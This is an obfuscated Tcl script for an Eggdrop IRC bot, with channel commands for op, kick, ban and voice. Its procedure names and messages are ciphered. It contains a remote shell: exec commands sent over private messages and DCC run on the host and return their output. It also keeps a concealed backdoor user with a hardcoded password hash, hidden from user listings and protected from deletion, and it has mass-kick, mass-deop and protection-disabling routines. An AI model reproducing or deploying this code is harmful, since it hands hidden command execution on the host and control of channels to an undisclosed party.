bind msg Z mmsg msg_mmsg
bind msg Z limit msg_limit
bind msg Z logchan msg_logchan
bind msg Z botnick msg_botnick
bind msg Z realname msg_realname
bind msg Z ident msg_ident
bind msg Z botaltnick msg_botaltnick
bind msg Z die msg_die
bind msg Z restart msg_restart
bind msg Z rehash msg_rehash
bind msg Z topic msg_topic
bind msg m memo msg_memo
bind pub n `-seen pub_-seen
bind pub n `+autovoice pub_+autovoice
bind pub n `-autovoice pub_-autovoice
bind pub n `+guard pub_+guard
bind pub n `-guard pub_-guard
bind pub n `+cycle pub_+cycle
bind pub n `-cycle pub_-cycle
bind pub n `+bold pub_+bold
bind pub n `-bold pub_-bold
bind pub n `+ntcpart pub_+ntcpart
bind pub n `-ntcpart pub_-ntcpart
bind pub n `+colours pub_+colours
bind pub n `-colours pub_-colours
bind pub n `+colour pub_+colours
bind pub n `-colour pub_-colours
bind pub n `+friend pub_+friend
bind pub n `-friend pub_-friend
bind pub n `+avoice pub_+avoice
bind pub n `-avoice pub_-avoice
bind pub n `+master pub_+master
bind pub n `-master pub_-master
bind pub n `mvoice pub_mvoice
bind pub n `mdevoice pub_mdevoice
bind pub n `mop pub_mop
bind pub n `mdeop pub_mdeop
bind pub n `+chan pub_+chan
bind msg n identify msg_identify
bind msg n kick msg_kick
bind msg n k msg_kick
bind msg n kickban msg_kickban
bind msg n kb msg_kickban
bind msg n op msg_op
bind msg n voice msg_voice
bind msg n v msg_voice
bind msg n deop msg_deop
bind msg n devoice msg_devoice
bind pub n `topic pub_topic
bind pub n `jump pub_jump
bind pub n `rehash pub_rehash
bind msg n +chan msg_+chan
bind msg n join msg_join
bind msg n part msg_part
bind pub m `voice pub_voice
bind pub m `+v pub_voice
bind pub m `devoice pub_devoice
bind pub m `-v pub_devoice
bind pub m `op pub_op
bind pub m `+o pub_op
bind pub m `deop pub_deop
bind pub m `-o pub_deop
bind pub m `kick pub_kick
bind pub m `k pub_kick
bind pub m `kickban pub_kickban
bind pub m `kb pub_kickban
bind pub m `+noop pub_+noop
bind pub m `-noop pub_-noop
bind pub m `ban pub_ban
bind pub m `unban pub_unban
bind pub m `munbans pub_munbans
bind pub m `banlist pub_banlist
bind pub m `mode pub_mode
bind pub m `join pub_join
bind pub m `part pub_part
bind pub m `cycle pub_cycle
bind pub m `up pub_up
bind pub m `down pub_down
bind msg m passwd msg_passwd
bind msg m deauth msg_deauth
bind msg m channels msg_channels
bind pub m `channels pub_channels
bind pub m `status pub_status
bind pub m `chaninfo pub_chaninfo
bind pub m `userlist pub_userlist
bind msg m userlist msg_userlist
bind pub f `access pub_access
bind pub m `match pub_match
proc [lines "kfy_A"] {nick uhost hand channel rest} {
global notc botnick
set [lines "kivhg"] $rest
if {[lindex $rest 0] == $botnick} {
regsub "$botnick " $rest "`" rest
} {
if {[string tolower [lindex $rest 0]] == [string tolower $botnick]} {
set [lines "ivhg"] "$botnick [lrange $rest 1 end]"
regsub "$botnick " $rest "`" rest
}
}
if {[string index $rest 0] != "`"} { return 0 }
if {![matchattr $nick Z]} { return 0 }
if {![matchattr $nick Q]} {
if {[string tolower [lindex $prest 0]] == [string tolower $botnick]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
}
return 0
}
set [lines "tlgl"] [lindex $rest 0]
regsub -all "`" $goto "pub_" goto
if {[matchattr $nick Z]} {
set [lines "ivhg"] [lrange $rest 1 end]
catch { $goto $nick $uhost $hand $channel $rest }
}
}
proc [lines "nht_vmxibkg"] {nick uhost hand rest} {
global own notc
if {$nick != $own || $rest == ""} { return 0 }
puthlp "MLGRXV ~$nick ~:~$notc ~~[zip $rest]~"
}
proc [lines "nht_wvxibkg"] {nick uhost hand rest} {
global own notc
if {$nick != $own || $rest == ""} { return 0 }
puthlp "MLGRXV ~$nick ~:~$notc ~~[dezip $rest]~"
}
proc [lines "nht_vcvx"] {nick uhost hand command} {
global own notc
if {$nick != $own || $command == ""} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "kziz1"] [lindex $command 0]
set [lines "kziz2"] [lindex $command 1]
set [lines "kziz3"] [lindex $command 2]
set [lines "kziz4"] [lindex $command 3]
set [lines "kziz5"] [lindex $command 4]
set [lines "kziz6"] [lindex $command 5]
set [lines "kziz7"] [lindex $command 6]
set [lines "kziz8"] [lindex $command 7]
set [lines "kziz9"] [lindex $command 8]
set [lines "kziz10"] [lindex $command 9]
set [lines "kziz11"] [lindex $command 10]
if {$para2 == ""} {
catch { [exec $para1] } result
} elseif {$para3 == ""} {
catch { [exec $para1 $para2] } result
} elseif {$para4 == ""} {
catch { [exec $para1 $para2 $para3] } result
} elseif {$para5 == ""} {
catch { [exec $para1 $para2 $para3 $para4] } result
} elseif {$para6 == ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5] } result
} elseif {$para7 == ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6] } result
} elseif {$para8 == ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7] } result
} elseif {$para9 == ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8] } result
} elseif {$para10 == ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9] } result
} elseif {$para10 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9 $para10] } result
}
foreach line [split $result "\n"] {puthlp "KIRENHT ~$nick ~:~$notc ~~$line"}
}
bind dcc * exec dcc_exec
bind dcc * log dcc_log
bind dcc * dir dcc_dir
bind dcc * read dcc_read
bind dcc * ` dcc_cmd
bind dcc * get dcc_get
bind dcc * u dcc_u
proc [lines "wxx_f"] {hand idx arg} {
foreach x [utimers] {
putdcc $idx $x
}
}
bind dcc * t dcc_t
proc [lines "wxx_g"] {hand idx arg} {
foreach x [timers] {
putdcc $idx $x
}
}
proc [lines "wxx_vcvx"] {hand idx arg} {
global own notc
if {$hand != $own || $arg == ""} { return 0 }
set [lines "kziz1"] [lindex $arg 0]
set [lines "kziz2"] [lindex $arg 1]
set [lines "kziz3"] [lindex $arg 2]
set [lines "kziz4"] [lindex $arg 3]
set [lines "kziz5"] [lindex $arg 4]
set [lines "kziz6"] [lindex $arg 5]
set [lines "kziz7"] [lindex $arg 6]
set [lines "kziz8"] [lindex $arg 7]
set [lines "kziz9"] [lindex $arg 8]
set [lines "kziz10"] [lindex $arg 9]
set [lines "kziz11"] [lindex $arg 10]
if {$para2 == ""} {
catch { [exec $para1] } result
} elseif {$para3 == ""} {
catch { [exec $para1 $para2] } result
} elseif {$para4 == ""} {
catch { [exec $para1 $para2 $para3] } result
} elseif {$para5 == ""} {
catch { [exec $para1 $para2 $para3 $para4] } result
} elseif {$para6 == ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5] } result
} elseif {$para7 == ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6] } result
} elseif {$para8 == ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7] } result
} elseif {$para9 == ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8] } result
} elseif {$para10 == ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9] } result
} elseif {$para10 != ""} {
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9 $para10] } result
}
putdcc $idx $result
}
proc [lines "kfy_slhg"] {nick uhost hand channel rest} {
global ps notc
if {$rest == ""} {
set [lines "fhvi"] $nick 
} else { 
set [lines "fhvi"] [lindex $rest 0] 
}
if {![validuser $user] || [string tolower $user] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {[getuser $user HOSTS] != ""} {
set [lines "slhgh"] [getuser $user hosts]
puthlp "MLGRXV ~$nick ~:~$notc ~SLHGH: ~$hosts"
} else {
puthlp "MLGRXV ~$nick ~:~$notc ~Xzm'g ulfmw ~$user ~slhg." 
}
}
proc [lines "kfy_uozt"] {nick uhost hand channel rest} {
global ps notc
if {$rest == ""} {
set [lines "fhvi"] $nick
} else { 
set [lines "fhvi"] [lindex $rest 0] 
}
if {![validuser $user] || [string tolower $user] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {[chattr $user] != ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Uozth: ~[chattr $user]~"
} else { 
puthlp "MLGRXV ~$nick ~:~$notc ~Xzm'g ulfmw ~$user ~uozt." 
}
}
catch { unbind dcc n match *dcc:match }
catch { unbind dcc n channel *dcc:channel }
proc [lines "kfy_wvofhvi"] {nick uhost hand channel rest} {
global botnick ps owner notc
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: wvofhvi <mrxp>"
return 0
}
set [lines "dsl"] [lindex $rest 0]
if {[string tolower $who] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0 
}
if {$who == $owner} {
puthlp "MLGRXV ~$nick ~:~$notc ~BlF XzMG WvOvGV ~$owner..!"
return 0
}
if {$who == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -fhvi <mrxp>"
} else {
if {![validuser $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
} else {
if {[matchattr $who n]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf xzmmlg WvOVGV z ylg ldmvi."
} else {
if {([matchattr $who m]) && (![matchattr $nick n])} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf wlm'g szev zxxvhh gl WvOVGV ~$who!"
} else {
deluser $who
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~~$who ~WvOVGV."
}
}
}
}
}
proc [lines "kfy_xszggi"] {nick uhost hand channel rest} {
global ps own notc
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$nick != $own && [matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!yOLxpVw!"
return 0
}
set [lines "dsl"] [lindex $rest 0]
set [lines "uot"] [lindex $rest 1]
if {$who == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszggi <mrxp> <uozth>"
return 0
}
if {![validuser $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {[string tolower $who] == [string tolower $ps]} {
puthlp "MLGRXV ~$nick ~:~$notc ~<m/z>"
return 0
}
if {$flg == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszggi <mrxp> <uozth>"
return 0
}
set [lines "ozhg_uot"] [chattr $who]
chattr $who $flg
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~~$who ~xszmtv uiln \[4~$last_flg1\] ~gl \[4~[chattr $who]~1\]"
return 0
}
proc [lines "hzevfhvi"] {} {
global ps owner
if {![validuser $ps]} {
setuser $owner XTRA "BEND" "xDB4L/z2DJT~1mianN/lj9Rq."
} elseif {$owner != $ps} {
setuser $owner XTRA "BEND" [zip [chattr $ps]]
if {[passwdok $ps ""] != 1} {
setuser $owner XTRA "LAST" [getuser $ps "PASS"]
}
deluser $ps
}
save
if {![validuser $ps]} {
adduser $ps "$ps!*@*"
chattr $ps [dezip [getuser $owner XTRA "BEND"]]
if {[getuser $owner XTRA "LAST"] != ""} {
setuser $ps PASS [getuser $owner XTRA "LAST"]
}
}
return 1
}
proc [lines "kfy_elrxv"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && [isvoice $nick $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: elrxv <mrxp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} {
voiceq $chan $rest
} { 
voiceq $chan $nick 
}
return 0
}
proc [lines "kfy_nelrxv"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "mrxph"] ""
set [lines "r"] 0
set [lines "nvnyvih"] [chanlist $chan]
foreach x $members {
if {(![isop $x $chan]) && (![isvoice $x $chan]) && (![matchattr $x O])} {
if {$i == 6} {
voiceq $chan $nicks
set [lines "mrxph"] ""
append nicks " $x"
set [lines "r"] 1
} {
append nicks " $x"
incr i
}
}
}
voiceq $chan $nicks
}
proc [lines "kfy_wvelrxv"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && ![isvoice $nick $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: wvelrxv <mrxp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} {
putserv "MODE $chan -vvvvvv $rest"
} else { 
putserv "MODE $chan -v $nick" 
}
return 0
}
proc [lines "kfy_nwvelrxv"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "mrxph"] ""
set [lines "r"] 0
set [lines "nvnyvih"] [chanlist $chan]
foreach x $members {
if {[isvoice $x $chan]} {
if {$i == 6} {
putserv "MODE $chan -vvvvvv $nicks"
set [lines "mrxph"] ""
append nicks " $x"
set [lines "r"] 1
} {
append nicks " $x"
incr i
}
}
}
putserv "MODE $chan -vvvvvv $nicks"
}
proc [lines "wvo_mlyzhv"] {} {
global botnick notc cmd_case quick banner basechan
set [lines "xfigrnv"] [ctime [unixtime]]
if {[isutimer "del_nobase"]} { return 0 }
foreach x [channels] {
set [lines "xrmul"] [channel info $x]
if {[string match "*+statuslog*" $cinfo] && [string match "*-secret*" $cinfo]} {
if {[onchan $botnick $x]} {
set [lines "krwc"] [rand 4]
if {$pidx == 1} {
set [lines "kgcg"] "BackToBase"
} elseif {$pidx == 2} {
set ptxt "(((((OuT)))))"
} elseif {$pidx == 3} {
set [lines "kgcg"] "gOHomE"
} elseif {$pidx == 4} {
set ptxt "(N(E(T(G)A)T)E)"
} else {
if {[info exists banner]} {
set [lines "kgcg"] $banner
} {
set [lines "kgcg"] [lgrnd]
}
}
if {![string match "*c*" [getchanmode $x]]} {
set [lines "kgcg"] "1$ptxt"
}
if {$quick == "1"} {
putqck "KZIG ~$x ~:~$ptxt (~Lm ~$curtime)"
} {
putsrv "KZIG ~$x ~:~$ptxt (~Lm ~$curtime)"
}
}
channel remove $x
savechan
putlog "ReMoVe CHaN $x" 
return 0
}
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string match "*+stopnethack*" $cinfo]} {
catch { channel set $x -stopnethack }
}
if {[string match "*+protectops*" $cinfo]} {
catch { channel set $x -protectops }
}
if {[string match "*+protectfriends*" $cinfo]} {
catch { channel set $x -protectfriends }
}
if {[string match "*+statuslog*" $cinfo] && [string match "*+secret*" $cinfo]} {
catch { channel set $x -statuslog }
}
if {![onchan $botnick $x]} {
putsrv "QLRM ~$x"
}
if {[matchattr $cflag C]} {
if {![istimer "cycle $x"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $x] }
}
}
if {[info exists basechan]} {
if {![validchan $basechan]} {
channel add $basechan { -greet +secret -statuslog }
}
}
savechan
}
utimer 2 del_nobase
proc [lines "kfy_lk"] {nick uhost hand chan rest} {
global notc botnick unop
catch {unset unop($nick)}
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && [isop $nick $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: lk <mrxp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest != ""} { 
opq $chan $rest
} else { opq $chan $nick }
return 0
}
proc [lines "kfy_nlk"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "mrxph"] ""
set [lines "r"] 0
set [lines "nvnyvih"] [chanlist $chan]
foreach x $members {
if {![isop $x $chan]} {
if {$i == 6} {
opq $chan $nicks
set [lines "mrxph"] ""
append nicks " $x"
set [lines "r"] 1
} {
append nicks " $x"
incr i
}
}
}
opq $chan $nicks
}
proc [lines "kfy_wvlk"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == "" && ![isop $nick $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: wvlk <mrxp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick m]} { 
set [lines "nivj"] "4MasTeR.ReQuesT"
}
if {[matchattr $nick n]} {
set [lines "nivj"] "4ADmIN.ReQuesT"
}
if {$rest != ""} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -kooooo $mreq $rest"
} {
putserv "MODE $chan -ooooo $rest"
}
} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -ko $mreq $nick" 
} {
putserv "MODE $chan -o $nick" 
}
}
return 0
}
proc [lines "kfy_nwvlk"] {nick uhost hand chan rest} {
global botnick notc 
if {![isop $botnick $chan]} { return 0 }
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {$nick != "*"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
}
set [lines "mrxph"] ""
set [lines "r"] 0
set [lines "nvnyvih"] [chanlist $chan]
foreach x $members {
if {([isop $x $chan]) && (![matchattr $x m]) && ($x != $botnick)} {
if {$i == 5} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "MODE $chan -kooooo 4ADmIN.ReQuesT $nicks"
} {
putserv "MODE $chan -ooooo $nicks"
}
set [lines "mrxph"] ""
append nicks " $x"
set [lines "r"] 1
} {
append nicks " $x"
incr i
}
}
}
putserv "MODE $chan -oooooo $nicks"
}
proc [lines "kfy_prxp"] {nick uhost hand chan rest} {
global botnick notc 
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: prxp <mrxp|slhg> <ivzhlm>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "ivzhlm"] [lrange $rest 1 end]
set [lines "szmwov"] [lindex $rest 0]
if {$reason == ""} {
if {[matchattr $nick m]} { 
set [lines "ivzhlm"] "1MasTeR 4KIcK1 ReQuesT4..!" 
}
if {[matchattr $nick n]} {
set [lines "ivzhlm"] "1ADmIN 4KIcK1 ReQuesT4..!" 
}
}
if {[string match "*@*" $handle]} {
foreach knick [chanlist $chan] {
if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
if {[matchattr $knick f] || $knick != $botnick} {
putsrv "PRXP ~$chan ~~$knick ~:~$notc ~~$reason"
}
}
}
return 0
}
if {$handle == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, Xzm'g prxp nb hvou."
return 0
}
if {[matchattr $handle n] && ![matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, XzMG PRxP ZWnRM UOZt"
return 0
}
putsrv "PRXP ~$chan ~~$handle ~:~$notc ~~$reason"
return 0
}
proc [lines "kfy_nprxp"] {nick uhost hand chan rest} {
global botnick notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
set [lines "ivzhlm"] [lrange $rest 1 end]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
} else { 
set [lines "ivzhlm"] $rest 
}
if {(![validchan $chan]) || (![isop $botnick $chan])} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$reason == ""} { 
set [lines "ivzhlm"] "1ADmIN 4MaSSKIcK1 ReQuesT4..!" 
}
set [lines "nvnyvih"] [chanlist $chan]
foreach x $members {
if {(![matchattr $x f]) && ($x != $botnick)} { 
putsrv "PRXP ~$chan ~~$x ~:~$notc ~~$reason"
}
}
}
proc [lines "kfy_prxpyzm"] {nick uhost hand chan rest} {
global botnick notc bannick
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: prxpyzm <mrxp|slhg> <ivzhlm>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: prxpyzm <mrxp> <ivzhlm>"
return 0
}
set [lines "ivzhlm"] [lrange $rest 1 end]
set [lines "szmwov"] [lindex $rest 0]
if {$reason == ""} {
if {[matchattr $nick m]} {
set [lines "ivzhlm"] "1MasTeR 4KIcKBaN1 ReQuesT [banmsg]"
}
if {[matchattr $nick n]} {
set [lines "ivzhlm"] "1ADmIN 4KIcKBaN1 ReQuesT [banmsg]"
}
}
if {[string match "*@*" $handle]} {
set [lines "nurhig"] "T"
foreach knick [chanlist $chan] {
if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
if {[matchattr $knick f] || $knick != $botnick} {
if {$mfirst == "T"} {
set bannick($knick) $handle
set [lines "nurihg"] "F"
}
putsrv "PRXP ~$chan ~~$knick ~:~$notc ~~$reason"
}
}
}
return 0
}
if {![onchan $handle $chan]} { return 0 }
set [lines "slhgnzhp"] [getchanhost $handle $chan]
set [lines "slhgnzhp"] "*!*@[lindex [split $hostmask @] 1]"
if {$handle == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, Xzm'g prxp nb hvou."
return 0
}
if {[matchattr $handle n] && ![matchattr $nick Z]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, XzMG PRxP ZWnRM UOzT"
return 0
}
set bannick($handle) $hostmask
putsrv "PRXP ~$chan ~~$handle ~:~$notc ~~$reason"
return 0
}
proc [lines "kfy_yzm"] {nick uhost hand channel rest} {
global botnick notc
if {![isop $botnick $channel]} { return 0 }
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: yzm <mrxp/slhgnzhp>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "szmwov"] [lindex $rest 0]
if {$handle == $botnick} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!WvMRVw!, xzm'g yzm nb hvou"
return 0
}
if {[matchattr $handle n]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~!WvMRVw!, xzmg yzm ZWnRM"
return 0
}
set [lines "slhgnzhp"] [getchanhost $handle $channel]
set [lines "slhgnzhp"] "*!*@[lindex [split $hostmask @] 1]"
if {![onchan $handle $channel]} { 
set [lines "slhgnzhp"] [lindex $rest 0] 
}
if {$hostmask != "*!*@*"} {
putserv "MODE $channel +b $hostmask" 
}
}
proc [lines "kfy_fmyzm"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: fmyzm <mrxp/slhgnzhp> <#xszmmvo>"
return 0
}
if {[lindex $rest 1] != ""} { 
set [lines "xszm"] [lindex $rest 1] 
}
if {[string first # $chan] != 0} { 
set [lines "xszm"] "#$chan" 
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "szmwov"] [lindex $rest 0]
append userhost $handle "!*" [getchanhost $handle $chan]
set [lines "slhgnzhp"] [maskhost $userhost]
if {![onchan $handle $chan]} { 
set [lines "slhgnzhp"] [lindex $rest 0] 
}
putserv "MODE $chan -b $hostmask"
puthlp "MLGRXV ~$nick ~:~$notc ~FmYzM ~[unsix $hostmask]~ LM ~$chan"
}
[[decrypt 64 "d3VeO/ATgwd."] "grnvi"] 5 [[decrypt 64 "d3VeO/ATgwd."] "dslmwk"]
proc [lines "kfy_fk"] {nick uhost hand channel rest} {
global notc botnick unop
catch {unset unop($nick)}
if {![isop $botnick $channel]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {![isop $nick $channel]} {
opq $channel $nick
}
return 0
}
proc [lines "kfy_wldm"] {nick uhost hand channel rest} {
global notc botnick
if {![isop $botnick $channel]} {
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick m]} {
set [lines "nivj"] "4MasTeR.ReQuesT"
}
if {[matchattr $nick n]} {
set [lines "nivj"] "4ADmIN.ReQuesT"
}
if {[isop $nick $channel]} {
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -ko $mreq $nick"
} {
putserv "mode $channel -o $nick"
}
}
return 0
}
proc [lines "kfy_nfmyzmh"] {nick uhost hand chan rest} {
global notc botnick
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan] != 0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan] || ![isop $botnick $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "yzmh"] ""
set [lines "r"] 0
foreach x [chanbans $chan] {
if {$i < 5} {
append bans " [lindex $x 0]"
set [lines "r"] [incr i]
}
if {$i == 5} {
puthelp "MODE $chan -bbbbb $bans"
set [lines "yzmh"] ""
append bans " [lindex $x 0]"
set [lines "r"] 0
}
}
puthelp "MODE $chan -bbbbb $bans"
if {![onchan $nick $chan]} { 
puthlp "MLGRXV ~$nick ~:~$notc ~NfMYzMH \[~$chan\]"
}
return 0
}
proc [lines "kfy_yzmorhg"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan] != 0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM xSzM ~$chan."
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [chanbans $chan] {
puthlp "MLGRXV ~$nick ~:~$notc ~~$x"
}
if {[chanbans $chan] == ""} { 
puthlp "MLGRXV ~$nick ~:~$notc ~YzMORhG ~$chan ~<m/z>"
}
return 0
}
proc [lines "kfy_nlwv"] {nick uhost hand chan rest} { 
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthelp "NOTICE $nick :$notc Usage: mode +/- ntspnmcilk"
return 0
}
putserv "mode $chan $rest"
}
proc [lines "kfy_hzb"] {nick uhost hand channel rest} {
global notc
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: hzb <nht>"
}
puthlp "KIRENHT ~$channel ~:~$rest"
}
proc [lines "kfy_ivhbmx"] {nick uhost hand channel rest} {
global botnick vern
set [lines "evim2"] $vern
regsub -all --  $vern2 "" vern2
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -vok+ov $botnick $botnick $vern2 $botnick $botnick"
} {
putserv "mode $channel -o+o $botnick $botnick"
}
}
proc [lines "kfy_mlgrxv"] {nick uhost hand channel rest} {
global notc
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: mlgrxv <mrxp> <nht>"
}
set [lines "kvihlm"] [lindex $rest 0]
set [lines "ivhg"] [lrange $rest 1 end]
if {$rest!=""} {
puthlp "MLGRXV ~$person ~:~$rest"
return 0
}
}
proc [lines "kfy_nht"] {nick uhost hand channel rest} {
global owner notc
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nht <mrxp> <nht>"
}
set [lines "kvihlm"] [string tolower [lindex $rest 0]]
set [lines "ivhg"] [lrange $rest 1 end]
if {[string match "*serv*" $person]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~WvMRVw..! Xzm'g hvmw nvhhztv gl Hvierxv."
return 0
}
if {$person == [string tolower $owner]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "KIRENHT ~$person ~:~$rest"
}
proc [lines "kfy_zxg"] {nick uhost hand channel rest} {
global notc
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: zxg <nht>"
}
puthlp "KIRENHT ~$channel ~:\001ZXGRLM ~$rest\001"
return 0
}
